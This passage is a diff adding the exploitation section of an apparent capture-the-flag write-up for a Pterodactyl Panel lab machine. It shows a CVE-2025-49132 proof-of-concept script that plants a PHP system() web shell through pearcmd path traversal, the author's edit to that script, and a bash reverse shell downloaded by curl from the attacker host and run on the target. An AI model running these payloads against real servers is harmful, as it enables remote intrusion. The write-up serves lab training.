@@ -135,3 +135,123 @@ We discovered **CVE-2025-49132**. Research into this presents us with the follow
 
 https://github.com/0xtensho/CVE-2025-49132-poc/
 
+Next, we must download and prepare the exploit:
+
+#### Downloading the exploit:
+
+```
+git clone https://github.com/0xtensho/CVE-2025-49132-poc/
+```
+
+#### Execute the exploit:
+
+```
+python3 poc.py panel.pterodactyl.htb id
+```
+
+#### Output:
+
+```
+{"..\/..\/..\/..\/..\/usr\/local\/lib\/php":{"pearcmd":[]}}{"..\/..\/..\/..\/..\/tmp":{"payload":[]}}
+```
+
+It did not work. Let's take a look at the source code:
+
+```
+import sys, os
+
+host=sys.argv[1]
+payload=sys.argv[2].replace(' ','\\$\\\\{IFS\\\\}')
+
+# Ugly but have to use curl since the package requests won't allow us to send characters like '{' without encoding them
+os.system(f"curl \"http://{host}/locales/locale.json?+config-create+/&locale=../../../../../usr/local/lib/php&namespace=pearcmd&/<?=system('{payload}')?>+/tmp/payload.php\"")
+
+os.system(f"curl \"http://{host}/locales/locale.json?locale=../../../../../tmp&namespace=payload\"")
+```
+
+What appears to be happening is a cURL request is being made where cURL is setting locale to /usr/local/lib/php and namespace to pearcmd, before executing a payload. Analysing the phpinfo file reveals that the absolute PEAR directory is in fact /usr/share/php/PEAR:
+
+```
+include_path	.:/usr/share/php8:/usr/share/php/PEAR	.:/usr/share/php8:/usr/share/php/PEAR
+```
+
+According to AI, the pearcmd.php file exists in different paths depending on the Linux Distribution, OS version or custom PHP installation. Therefore, by updating the script we can reattempt our code execution exploit:
+
+#### Updated script:
+
+```
+import sys, os
+
+host=sys.argv[1]
+payload=sys.argv[2].replace(' ','\\$\\\\{IFS\\\\}')
+
+# Ugly but have to use curl since the package requests won't allow us to send characters like '{' without encoding them
+os.system(f"curl \"http://{host}/locales/locale.json?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system('{payload}')?>+/tmp/payload.php\"")
+os.system(f"curl \"http://{host}/locales/locale.json?locale=../../../../../tmp&namespace=payload\"")
+```
+
+#### Execute the exploit:
+
+```
+python3 poc.py panel.pterodactyl.htb id | grep -i '#PEAR_Config' -A 1
+```
+
+#### Output:
+
+```
+#PEAR_Config 0.9
+a:13:{s:7:"php_dir";s:88:"/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
+```
+
+### Getting a shell
+
+To obtain access we will set up a listener on our attacker machine before using a cURL payload to download a reverse bash shell onto the server, execute it, and catch the session on our listener. 
+
+#### Set up a listener:
+
+```
+nc -lvnp 4444
+```
+
+#### Creating shell.sh:
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.16/4444 0>&1
+```
+
+#### Start Python webserver:
+
+```
+python3 -m http.server 9001
+```
+
+#### Download the file onto the server:
+
+```
+python3 poc.py panel.pterodactyl.htb 'curl http://10.10.14.16:9001/rev.sh -O rev.sh'
+```
+
+#### Give the file executable permissions:
+
+```
+python3 poc.py panel.pterodactyl.htb 'chmod 777 rev.sh'
+```
+
+#### Execute the exploit:
+
+```
+python3 poc.py panel.pterodactyl.htb './rev.sh'
+```
+
+#### Output:
+
+```
+Listening on 0.0.0.0 4444
+Connection received on 10.129.92.38 52924
+bash: cannot set terminal process group (1230): Inappropriate ioctl for device
+bash: no job control in this shell
+wwwrun@pterodactyl:/var/www/pterodactyl/public> id
+id
+uid=474(wwwrun) gid=477(www) groups=477(www)
+```
